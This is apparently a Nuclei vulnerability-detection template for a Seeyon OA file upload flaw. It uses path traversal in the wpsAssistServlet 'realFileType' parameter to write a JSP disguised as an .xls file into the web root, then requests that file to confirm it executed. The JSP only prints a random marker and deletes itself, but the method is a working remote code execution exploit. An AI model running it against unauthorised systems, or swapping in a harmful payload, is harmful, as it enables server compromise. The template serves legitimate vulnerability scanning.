id: seeyon-oa-file-upload
info:
  name: Seeyon OA File Upload
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Seeyon OA file upload vulnerability allowing arbitrary file upload and execution.

variables:
  s1: "{{rand_int(1000000000, 9000000000)}}"
  s2: "{{rand_text_alpha(20)}}"

http:
  - id: "r0"
    method: POST
    path:
      - "{{BaseURL}}/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{s2}}.jsp&fileId=2"
    headers:
      Content-Type: "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b"
    body: |
      --59229605f98b8cf290a7b8908b34616b
      Content-Disposition: form-data; name="upload"; filename="123.xls"
      Content-Type: application/vnd.ms-excel

      <% out.println("{{s1}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
      --59229605f98b8cf290a7b8908b34616b--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "success"

  - id: "r1"
    method: GET
    path:
      - "{{BaseURL}}/{{s2}}.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{s1}}"
